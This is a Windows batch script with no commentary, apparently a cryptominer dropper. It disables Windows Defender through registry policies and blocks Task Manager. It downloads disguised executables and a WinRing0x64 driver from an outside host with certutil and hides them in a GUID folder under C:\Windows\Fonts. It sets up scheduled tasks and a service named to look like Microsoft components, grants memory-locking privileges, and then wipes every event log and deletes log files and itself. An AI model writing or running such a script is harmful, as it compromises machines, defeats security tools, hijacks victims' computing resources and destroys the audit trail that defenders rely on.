cd..
cd..
cd..
c:
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /d 00000001 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /d 00000001 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /d 00000001 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /d 00000001 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /d "Hotkey Disabled" /f
md C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}
schtasks /end /TN "\Microsoft\Windows\IIS"
schtasks /Delete /TN "\Microsoft\Windows\IIS"  /F
sc stop "Networks"
attrib -a -s -r -h C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\
attrib -a -s -r -h C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\*.*
certutil.exe -urlcache -split -f "http://999.accesscam.org/1/1/fonts/3.jpg" "C:\Windows\temp\1.xml"
certutil.exe -urlcache -split -f "http://999.accesscam.org/1/1/fonts/up.jpg" "C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\up.cmd"
certutil.exe -urlcache -split -f "http://999.accesscam.org/1/1/fonts/ad.jpg" "C:\Windows\temp\AD.xml"
SCHTASKS /CREATE /XML "C:\Windows\temp\AD.xml" /TN \Microsoft\Windows\AD
del "C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\config.json"
del "C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\ShellExperienceHost.exe"
certutil.exe -urlcache -split -f "http://999.accesscam.org/1/1/fonts/1.jpg" "C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\config.json"
certutil.exe -urlcache -split -f "http://999.accesscam.org/1/1/fonts/99.jpg" "C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\WinRing0x64.sys"
certutil.exe -urlcache -split -f "http://999.accesscam.org/1/1/fonts/2.jpg" "C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\2.jpg"
certutil.exe -decode "C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\2.jpg" "C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\ShellExperienceHost.exe"
SCHTASKS /CREATE /XML "C:\Windows\temp\1.xml" /TN \Microsoft\Windows\IIS
certutil.exe -urlcache -split -f "http://999.accesscam.org/1/1/fonts/nt.jpg" "C:\Windows\system32\ntrights.exe"
cd C:\Windows\System32
ntrights -u "SYSTEM" +r SeLockMemoryPrivilege
schtasks /Run /TN "\Microsoft\Windows\IIS"
certutil.exe -urlcache -split -f "http://999.accesscam.org/1/1/fonts/sv.jpg" "C:\Windows\Fonts\svchost.exe"
C:\Windows\Fonts\svchost.exe install "Networks" "C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\ShellExperienceHost.exe"
sc config "Networks" DisplayName= "Networkdriver"
Set ProcessName=systems.exe
sc start "Networks"
attrib -a -s -r -h C:\Windows\debug\Nat
del "C:\Windows\debug\Nat\config.json"
xcopy /H /Y C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\config.json C:\Windows\debug\Nat\
xcopy /H /Y C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\config.json C:\Windows\Fonts\
xcopy /H /Y C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\config.json C:\Windows\
del "C:\Windows\temp\1.xml"
del "C:\Windows\temp\AD.xml"
attrib +a +s +r +h C:\Windows\Fonts\{3f5tgq32-2b5n3878-9kg063dr-8uyt46jc-88a6cb88}\*.*
del C:\Windows\temp\cl.bat
echo @echo off >> C:\Windows\temp\cl.bat
echo FOR /F "tokens=1,2*" %%%%V IN ('bcdedit') DO SET adminTest=%%%%V >> C:\Windows\temp\cl.bat
echo for /F "tokens=*" %%%%G in ('wevtutil.exe el') DO (call :do_clear "%%%%G") >> C:\Windows\temp\cl.bat
echo echo.>> C:\Windows\temp\cl.bat
echo echo goto theEnd >> C:\Windows\temp\cl.bat
echo :do_clear >> C:\Windows\temp\cl.bat
echo echo clearing %%1 >> C:\Windows\temp\cl.bat
echo wevtutil.exe cl %%1 >> C:\Windows\temp\cl.bat
echo goto :eof >> C:\Windows\temp\cl.bat
echo :noAdmin >> C:\Windows\temp\cl.bat
echo exit >> C:\Windows\temp\cl.bat
start C:\Windows\temp\cl.bat
del /s C:\*.log
del C:\Windows\temp\cl.bat
del C:\1.cmd
del C:\Windows\fonts\1.cmd
exit

